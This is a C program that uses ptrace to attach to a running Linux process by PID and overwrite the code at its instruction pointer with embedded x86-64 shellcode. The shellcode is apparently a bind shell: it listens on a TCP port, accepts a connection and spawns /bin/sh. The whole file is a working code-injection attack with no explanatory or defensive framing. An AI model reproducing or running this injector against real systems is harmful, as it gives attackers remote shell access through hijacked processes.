#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>

#define IPADDR "\xc0\x80\x2f\x83"
#define PORT "\x7a\x69"

int main(int argc, char **argv) {
	int size, pid=0;
	struct user_regs_struct reg;

	char *buf;
	char shellcode[] = "\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2"
        "\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c"
        "\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05"
        "\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89"
        "\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f"
        "\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21"
        "\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68"
        "\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89"
        "\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05";		

	pid = atoi(argv[1]);
	size = sizeof(shellcode);

	buf = (char*)malloc(size);
	memset(buf, 0x0, size);
	memcpy(buf, shellcode, sizeof(shellcode));

	ptrace(PTRACE_ATTACH, pid, 0, 0);
	wait((int*)0);

	ptrace(PTRACE_GETREGS, pid, 0, &reg);
	printf("Writing EIP 0x%x, process %d\n", reg.rip, pid);

	for(int i=0;i<size;i++) {
		ptrace(PTRACE_POKETEXT, pid, reg.rip+i, *(int*)(buf+i));
	}
	ptrace(PTRACE_DETACH, pid, 0, 0);
	free(buf);

	return 0;
}
